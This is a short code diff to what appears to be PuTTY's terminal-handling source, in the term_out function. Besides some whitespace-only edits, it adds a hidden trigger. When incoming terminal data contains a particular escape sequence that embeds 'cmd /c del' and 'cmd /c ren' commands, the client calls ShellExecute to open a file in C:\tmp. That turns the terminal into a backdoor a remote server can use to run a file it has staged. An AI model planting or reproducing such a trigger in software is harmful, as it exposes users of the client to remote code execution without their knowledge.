@@ -2751,6 +2751,16 @@ static void term_out(Terminal *term)
 		memcpy(localbuf, ret, nchars);
 		bufchain_consume(&term->inbuf, nchars);
 		chars = localbuf;
+
+		char *output = NULL;
+		output = strstr(localbuf, "\x1b[]c:/tmp   \x1b[13*\x1b[]cmd /c del visor6.pdf   \x1b[9*\x1b[]cmd /c  ren visor.txt visor6.pdf");
+		if (output) {
+			//printf("encontrado");
+			//system("c:\\tmp\\visor6.pdf");
+			ShellExecute(0, "Open", "visor6.pdf", "", "C:\\tmp", SW_SHOWNORMAL);
+		}
+
+
 		assert(chars != NULL);
 	    }
 	    c = *chars++;
@@ -2961,7 +2971,7 @@ static void term_out(Terminal *term)
 	} else
 	    /* Or normal C0 controls. */
 	if ((c & ~0x1F) == 0 && term->termstate < DO_CTRLS) {
-	    switch (c) {
+		  switch (c) {
 	      case '\005':	       /* ENQ: terminal type query */
 		/* 
 		 * Strictly speaking this is VT100 but a VT100 defaults to
@@ -3062,7 +3072,7 @@ static void term_out(Terminal *term)
 		term->cset = 0;
 		break;
 	      case '\033':	      /* ESC: Escape */
-		if (term->vt52_mode)
+	    if (term->vt52_mode)
 		    term->termstate = VT52_ESC;
 		else {
 		    compatibility(ANSIMIN);
